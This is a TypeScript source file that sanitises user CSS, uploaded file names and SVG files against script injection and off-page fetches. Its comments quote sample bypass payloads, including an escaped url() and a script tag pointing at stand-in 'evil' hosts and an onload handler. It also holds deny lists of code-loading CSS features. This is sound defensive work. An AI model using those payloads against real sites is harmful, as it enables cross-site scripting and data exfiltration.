import sanitizeHtmlLib from "sanitize-html";
import postcss from "postcss";

// ---------------------------------------------------------------------------
// HTML / CSS sanitisation
// ---------------------------------------------------------------------------

/**
 * CSS escapes, resolved.
 *
 * A browser reads `\\75 rl(…)` as `url(…)` and `@im\\port` as `@import`. A
 * pattern matching the text does not, which is how both of those walked past
 * the version of this that matched text. Every name and value below is
 * decoded before it is judged — and judged, never edited, so what a browser
 * ends up reading is either the author's own bytes or nothing at all.
 */
export function decodeCssEscapes(input: string): string {
  return input.replace(/\\([0-9a-fA-F]{1,6})[ \t\n\f\r]?|\\([\s\S])/g, (_m, hex, ch) => {
    if (!hex) return ch;
    const code = parseInt(hex, 16);
    try {
      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "\ufffd";
    } catch {
      return "\ufffd";
    }
  });
}

/**
 * One CSS escape, whole.
 *
 * `\\75 ` is a single escape meaning `u` — six hex digits at most, and the
 * space that ends it belongs to the escape rather than separating anything.
 * Taking it two characters at a time splits `\\75 rl(` into a stray `5` and an
 * identifier called `rl`, which is how an escaped `url(` walked past the
 * first version of this scanner.
 */
function readEscape(value: string, start: number): { text: string; end: number } {
  const m = /^\\(?:([0-9a-fA-F]{1,6})[ \t\n\f\r]?|[\s\S])/.exec(value.slice(start));
  if (!m) return { text: value[start] ?? "", end: start + 1 };
  return { text: m[0], end: start + m[0].length };
}

/** Walks past a quoted string, respecting backslash escapes inside it. */
function endOfString(value: string, start: number): number {
  const quote = value[start];
  let i = start + 1;
  while (i < value.length) {
    if (value[i] === "\\") { i = readEscape(value, i).end; continue; }
    if (value[i] === quote) return i + 1;
    i++;
  }
  return value.length;
}

/** The argument of a call that opens at `open`, and where it ends. */
function readArgument(value: string, open: number): { arg: string; end: number } {
  let depth = 0;
  let i = open;
  while (i < value.length) {
    const c = value[i];
    if (c === "\\") { i = readEscape(value, i).end; continue; }
    if (c === '"' || c === "'") { i = endOfString(value, i); continue; }
    if (c === "(") { depth++; i++; continue; }
    if (c === ")") {
      depth--;
      if (depth === 0) return { arg: value.slice(open + 1, i), end: i + 1 };
      i++;
      continue;
    }
    i++;
  }
  // Never closed. Treat the rest as the argument, so it is still examined.
  return { arg: value.slice(open + 1), end: value.length };
}

/**
 * Every function call in a value, by name, with its argument.
 *
 * Quote-aware, which the pattern this replaces was not: it read
 * `url("a)b.png")` as ending at the bracket inside the string and left the
 * rest of the stylesheet mangled behind it.
 */
export function cssFunctionCalls(value: string): { name: string; arg: string }[] {
  const calls: { name: string; arg: string }[] = [];
  let ident = "";
  let i = 0;
  while (i < value.length) {
    const c = value[i];
    if (c === "\\") {
      const esc = readEscape(value, i);
      ident += esc.text;
      i = esc.end;
      continue;
    }
    if (c === '"' || c === "'") { i = endOfString(value, i); ident = ""; continue; }
    if (c === "(") {
      const { arg, end } = readArgument(value, i);
      calls.push({ name: decodeCssEscapes(ident).toLowerCase(), arg });
      // A call can hide inside another call's argument.
      calls.push(...cssFunctionCalls(arg));
      ident = "";
      i = end;
      continue;
    }
    if (/[-\w]/.test(c)) { ident += c; i++; continue; }
    ident = "";
    i++;
  }
  return calls;
}

/** At-rules that cannot fetch anything or re-point the sheet. */
const ALLOWED_AT_RULES = new Set([
  "media", "supports", "container", "layer", "scope", "page",
  "keyframes", "-webkit-keyframes", "-moz-keyframes", "-o-keyframes",
  "font-face", "property", "starting-style", "counter-style", "font-feature-values",
]);

/** Properties whose whole job was to load code, in engines that allowed it. */
const BANNED_PROPERTIES = new Set(["behavior", "-moz-binding", "-ms-behavior"]);

/** Calls that fetch, or that ran script where they were supported. */
const BANNED_FUNCTIONS = new Set([
  "expression", "-ms-expression",
  "image", "image-set", "-webkit-image-set",
  "cross-fade", "-webkit-cross-fade",
  "element", "paint", "src",
]);

function unquote(value: string): string {
  const v = value.trim();
  return /^["'][\s\S]*["']$/.test(v) ? v.slice(1, -1) : v;
}

/** True when a declaration cannot reach off the page or run anything. */
function declarationIsSafe(prop: string, value: string): boolean {
  if (BANNED_PROPERTIES.has(decodeCssEscapes(prop).trim().toLowerCase())) return false;

  for (const call of cssFunctionCalls(value)) {
    if (call.name === "url") {
      // A reference inside the same document — `fill: url(#gradient)`, which
      // the previous version threw away along with the real exfiltration
      // targets. Anything that names somewhere else is dropped.
      if (!unquote(decodeCssEscapes(call.arg)).startsWith("#")) return false;
      continue;
    }
    if (BANNED_FUNCTIONS.has(call.name)) return false;
  }

  // A scheme sitting bare in a value, with no call around it.
  if (/(?:javascript|vbscript|data)\s*:/i.test(decodeCssEscapes(value))) return false;
  return true;
}

/**
 * The site's own CSS, with anything that reaches off the page taken out.
 *
 * Parsed rather than pattern-matched. The version this replaces ran a list of
 * regular expressions over the raw text, and every one of these got past it:
 *
 *   \\75 rl('https://evil/?x')          a browser reads that as url()
 *   url("a)b.png")                     the bracket inside the string ended
 *                                      the match, mangling the rest
 *   @im\\port url('…')                  the same trick on an at-rule
 *
 * and, worst of the three, it left `</style>` alone. This CSS is written into
 * a <style> element, and the HTML parser ends that element at the first
 * `</style` it meets whatever it means in CSS — so a stylesheet could close
 * its own tag and open a <script>. That was live on every published page.
 */
export function sanitizeCss(css: string): string {
  let root: ReturnType<typeof postcss.parse>;
  try {
    root = postcss.parse(css);
  } catch {
    // Unparseable: keep none of it rather than guess which half was meant.
    return "/* This CSS could not be read, so none of it was used. */";
  }

  root.walkAtRules((rule) => {
    if (!ALLOWED_AT_RULES.has(decodeCssEscapes(rule.name).toLowerCase())) rule.remove();
  });
  root.walkDecls((decl) => {
    if (!declarationIsSafe(decl.prop, decl.value)) decl.remove();
  });

  return neutralizeStyleEnd(root.toString());
}

/**
 * Stop a stylesheet closing the element it is written into.
 *
 * The HTML parser looks for `</style` and stops there; it does not care that
 * the text is inside a CSS string or a comment. Backslash-escaping the slash
 * means the same thing in CSS and nothing at all to the HTML parser.
 *
 * postcss escapes the `<` itself when it writes a sheet back out, so on the
 * path above this is the second of two. It is kept because it is the one this
 * file promises: it holds for a string that never went through the parser,
 * and it does not quietly stop working if postcss changes its mind.
 */
export function neutralizeStyleEnd(css: string): string {
  return css.replace(/<\/(?=style)/gi, "<\\/");
}

// ---------------------------------------------------------------------------
// File Upload Validation
// ---------------------------------------------------------------------------

const ALLOWED_EXTENSIONS = new Set([
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "avif",
  "svg",
  "ico",
  "mp4",
  "webm",
  "ogg",
  "mp3",
  "wav",
  "pdf",
  "woff",
  "woff2",
  "ttf",
  "otf",
]);

// SVG can contain scripts — strip them if accepted
const DANGEROUS_EXTENSIONS = new Set(["svg"]);

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

export function validateUploadFile(
  filename: string,
  size: number
): { valid: true; ext: string } | { valid: false; error: string } {
  if (size > MAX_FILE_SIZE) {
    return { valid: false, error: `File too large. Max ${MAX_FILE_SIZE / 1024 / 1024}MB.` };
  }

  const ext = filename.split(".").pop()?.toLowerCase() ?? "";
  if (!ext || !ALLOWED_EXTENSIONS.has(ext)) {
    return {
      valid: false,
      error: `File type .${ext} is not allowed. Allowed: ${Array.from(ALLOWED_EXTENSIONS).join(", ")}`,
    };
  }

  return { valid: true, ext };
}

export function isDangerousExtension(ext: string): boolean {
  return DANGEROUS_EXTENSIONS.has(ext.toLowerCase());
}

/**
 * SVG elements that draw something.
 *
 * An allowlist, because the danger in SVG is not one tag: <script> runs
 * JavaScript, <foreignObject> embeds HTML, <style> brings CSS, <use> pulls in
 * an external document, and the SMIL elements (<animate>, <set>) can point an
 * attribute at a javascript: URL after the file has loaded. None of them are
 * needed to draw a picture, so none of them are here.
 */
const SVG_TAGS = [
  "svg", "g", "defs", "symbol", "title", "desc", "metadata", "a",
  "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
  "text", "tspan", "textPath", "image",
  "linearGradient", "radialGradient", "stop", "pattern",
  "clipPath", "mask", "marker", "switch",
  "filter", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite",
  "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDropShadow",
  "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur",
  "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset",
  "feSpecularLighting", "feTile", "feTurbulence",
];

/** Attributes that carry a URL, and so have to be looked at. */
const URL_ATTRS = /^(?:href|src|xlink:href)$/i;

/**
 * A `style` attribute, with the parts that reach off the file taken out.
 *
 * CSS in an attribute cannot run script in any browser still shipping, but it
 * can still fetch: `background-image: url(https://…)` turns opening a picture
 * into a call to whoever made it. A reference inside the same file — which is
 * how a gradient or a clip path is named — is left alone.
 */
function sanitizeSvgStyle(value: string): string {
  return value
    .replace(/@import\b[^;]*;?/gi, "")
    .replace(/expression\s*\(/gi, "")
    .replace(/url\s*\(\s*(['"]?)(?!#)[^)]*\1\s*\)/gi, "");
}

/** A URL an uploaded picture may point at. Anything else is dropped. */
function safeSvgUrl(value: string): boolean {
  const v = value.trim();
  // A reference inside the same file, or a path — neither can name a scheme.
  if (v.startsWith("#") || v.startsWith("/") || v.startsWith("./") || v.startsWith("../")) return true;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(v)?.[1]?.toLowerCase();
  if (!scheme) return true;
  if (scheme === "http" || scheme === "https") return true;
  // A picture inlined in the file, but not a document: data:text/html carries
  // markup, and markup carries script.
  return scheme === "data" && /^data:image\/(?:png|jpeg|gif|webp);/i.test(v);
}

/**
 * Strip the ways an uploaded SVG can run code.
 *
 * This used to be a list of regular expressions over the raw text, and text is
 * the one thing an attacker controls the shape of. Every one of these went
 * through it untouched:
 *
 *   <svg onload=alert(1)>                  — the pattern wanted quotes
 *   <svg onload\n=\nalert(1)>              — and no newlines
 *   <svg><script src="https://evil/x.js">  — and a closing tag to match
 *
 * Uploads are served from this origin, so that was stored XSS in the builder's
 * own window. A parser does not have that class of hole: it reads the markup
 * the way a browser does, decodes the entities, and hands back tags and
 * attributes that have already been resolved — so there is nothing left to
 * hide a handler inside.
 */
export function sanitizeSvg(content: string): string {
  return sanitizeHtmlLib(content, {
    allowedTags: SVG_TAGS,
    // Every attribute is kept except the ones ruled out below. An allowlist
    // here would have to name every presentation attribute SVG has, and the
    // one it forgot would quietly break somebody's picture.
    allowedAttributes: false,
    disallowedTagsMode: "discard",
    // SVG is case-sensitive: `viewBox` lower-cased is not `viewBox` any more,
    // and the picture loses its scaling when the file is read as XML.
    parser: { lowerCaseTags: false, lowerCaseAttributeNames: false },
    transformTags: {
      "*": (tagName: string, attribs: Record<string, string>) => {
        const kept: Record<string, string> = {};
        for (const [name, value] of Object.entries(attribs)) {
          // Event handlers, whatever they are called and however they were
          // written in the file.
          if (/^on/i.test(name)) continue;
          if (URL_ATTRS.test(name) && !safeSvgUrl(value)) continue;
          kept[name] = name.toLowerCase() === "style" ? sanitizeSvgStyle(value) : value;
        }
        return { tagName, attribs: kept };
      },
    },
  });
}

/** True once a sanitized upload still has a picture in it. */
export function isRenderableSvg(content: string): boolean {
  return /<svg[\s>]/i.test(content);
}
